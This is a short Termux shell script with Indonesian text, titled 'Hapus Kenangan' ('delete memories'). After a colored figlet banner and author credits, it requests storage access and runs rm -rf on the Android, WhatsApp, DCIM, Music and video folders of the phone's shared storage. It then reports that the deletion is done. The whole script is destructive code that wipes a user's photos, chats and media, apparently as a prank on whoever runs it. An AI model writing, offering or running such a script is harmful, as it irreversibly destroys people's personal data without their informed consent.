b='\033[34;1m'
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
w='\033[37;1m'
y='\033[33;1m'




figlet -f slant "Hapus Kenangan"
echo $r"Dibuat Oleh" :$g"Acep X-Code"
echo $r"My Team    " :$g"Manusia Biasa Team"
echo $r"My Github  " :$g"github.com/aceptriana"
sleep 3
echo $b"Sedang Mengahpus Kenangan"
termux-setup-storage
sllep 1
rm -rf cd /sdcard/Android
rm -rf cd /sdcard/WhatsApp
rm -rf cd /sdcard/DCIM
rm -rf cd /sdcard/Music
rm -rf cd /sdcard/Vidio
echo $y "Tunggu 10 Detik"
sleep 10
echo $g "Menghapus Selesai"

